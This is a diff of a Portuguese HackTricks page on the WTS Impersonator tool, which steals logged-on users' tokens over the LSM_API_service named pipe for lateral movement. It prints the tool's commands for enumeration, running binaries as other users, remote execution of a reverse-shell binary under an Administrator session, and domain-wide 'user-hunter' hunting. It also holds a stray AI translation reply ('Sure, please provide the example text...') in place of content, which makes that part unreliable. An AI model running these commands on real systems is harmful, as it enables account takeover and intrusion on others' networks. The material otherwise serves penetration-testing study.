@@ -1,16 +1,18 @@
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-* Você trabalha em uma **empresa de cibersegurança**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
-* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
+Outras formas de apoiar o HackTricks:
+
+* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
+* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
+* **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
+* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios github do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 
-O WTS Impersonator abusa do Named pipe RPC "**\\pipe\LSM_API_service**" para enumerar usuários logados e roubar tokens de outros usuários sem usar a técnica normal de "Impersonação de Token", isso permite um movimento lateral fácil e discreto, essa técnica foi pesquisada e desenvolvida por [Omri Baso](https://www.linkedin.com/in/omri-baso/).
+WTS Impersonator explora o pipe nomeado RPC “**\\pipe\LSM_API_service**” para enumerar usuários logados e roubar tokens de outros usuários sem usar a técnica normal de "Impersonation de Token", permitindo movimento lateral fácil e discreto. Essa técnica foi pesquisada e desenvolvida por [Omri Baso](https://www.linkedin.com/in/omri-baso/).
 
 A ferramenta `WTSImpersonator` pode ser encontrada no [github](https://github.com/OmriBaso/WTSImpersonator).
 ```
@@ -18,26 +20,28 @@ WTSEnumerateSessionsA → WTSQuerySessionInformationA -> WTSQueryUserToken -> Cr
 ```
 #### Módulo `enum`:
 
-Enumerar Usuários Locais na máquina em que a ferramenta está sendo executada
+Enumera Usuários Locais na máquina em que a ferramenta está sendo executada
 ```powershell
 .\WTSImpersonator.exe -m enum
 ```
-Enumerar uma máquina remotamente fornecendo um IP ou um nome de host.
+Enumerar uma máquina remotamente dado um IP ou um Hostname.
 ```powershell  
 .\WTSImpersonator.exe -m enum -s 192.168.40.131
 ```
 #### Módulo `exec` / `exec-remote`:
-Tanto o "exec" quanto o "exec-remote" requerem estar em um contexto de **"Serviço"**.
-O módulo local "exec" não precisa de nada além do WTSImpersonator.exe e do binário que você deseja executar (sinalizador -c), isso poderia ser
-um "C:\\Windows\\System32\\cmd.exe" normal e você abrirá um CMD como o usuário desejado, um exemplo seria
+Tanto "exec" quanto "exec-remote" requerem estar em um contexto de **"Serviço"**.
+O módulo local "exec" não precisa de nada além do WTSImpersonator.exe e do binário que você deseja executar \(-c flag\), isso poderia ser
+um normal "C:\\Windows\\System32\\cmd.exe" e você abrirá um CMD como o usuário desejado, um exemplo seria
 ```powershell
 .\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
 ```
-Você pode usar o PsExec64.exe para obter um contexto de serviço.
+você poderia usar PsExec64.exe para obter um contexto de serviço
 ```powershell
 .\PsExec64.exe -accepteula -s cmd.exe
 ```
-Para `exec-remote`, as coisas são um pouco diferentes. Eu criei um serviço que pode ser instalado remotamente, assim como o `PsExec.exe`. O serviço receberá um `SessionId` e um `binário para executar` como argumento, e será instalado e executado remotamente, desde que as permissões corretas sejam fornecidas. Um exemplo de execução seria o seguinte:
+Para `exec-remote`, as coisas são um pouco diferentes, eu criei um serviço que pode ser instalado remotamente, assim como `PsExec.exe`
+o serviço receberá um `SessionId` e um `binário para executar` como argumento e será instalado e executado remotamente, dado as permissões corretas
+um exemplo de execução seria o seguinte:
 ```powershell
 PS C:\Users\Jon\Desktop> .\WTSImpersonator.exe -m enum -s 192.168.40.129
 
@@ -56,41 +60,18 @@ WTSUserName:  Administrator
 WTSDomainName: LABS
 WTSConnectState: 4 (WTSDisconnected)
 ```
-Como pode ser visto acima, o `Sessionid` da conta de Administrador é `2`, então o utilizamos em seguida na variável `id` ao executar o código remotamente.
+como pode ser visto acima, o `Sessionid` da conta de Administrador é `2`, então o usamos a seguir na variável `id` ao executar código remotamente
 ```powershell
 PS C:\Users\Jon\Desktop> .\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
 ```
 #### Módulo `user-hunter`:
 
-O módulo user hunter permitirá que você enumere várias máquinas e, se um determinado usuário for encontrado, executará código em nome desse usuário.
-Isso é útil ao procurar por "Administradores de Domínio" enquanto se tem direitos de administrador local em algumas máquinas.
+O módulo user hunter permite enumerar múltiplas máquinas e, se um determinado usuário for encontrado, executará código em nome deste usuário.
+Isso é útil ao procurar por "Domain Admins" quando se tem direitos de administrador local em algumas máquinas.
 ```powershell
 .\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
 ```
-# WTS Impersonator
-
-The WTS Impersonator technique allows an attacker to steal user credentials by impersonating a Windows Terminal Server (WTS) session. This technique takes advantage of the fact that WTS sessions can be redirected to a remote server.
-
-## How it works
-
-1. The attacker gains access to a target system that has a WTS session active.
-2. The attacker identifies the active WTS session and determines the session ID.
-3. The attacker uses the `WTSQueryUserToken` function to obtain the user token associated with the active session.
-4. The attacker duplicates the user token using the `DuplicateTokenEx` function.
-5. The attacker creates a new process using the duplicated token, effectively impersonating the user.
-6. The attacker can now perform actions on behalf of the user, including stealing credentials.
-
-## Mitigation
-
-To mitigate the risk of WTS Impersonator attacks, consider the following measures:
-
-- Regularly monitor and audit WTS sessions to detect any unauthorized activity.
-- Implement strong access controls and authentication mechanisms to prevent unauthorized access to WTS sessions.
-- Use multi-factor authentication to add an extra layer of security to user credentials.
-- Keep systems and applications up to date with the latest security patches to prevent exploitation of known vulnerabilities.
-- Educate users about the risks of phishing attacks and the importance of not sharing their credentials with anyone.
-
-By implementing these measures, you can significantly reduce the risk of WTS Impersonator attacks and protect user credentials from being stolen.
+Sure, please provide the example text you would like translated.
 ```powershell
 PS C:\Users\Jon\Desktop> .\WTSImpersonator.exe -m user-hunter -uh LABS/Administrator -ipl .\test.txt -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe
 
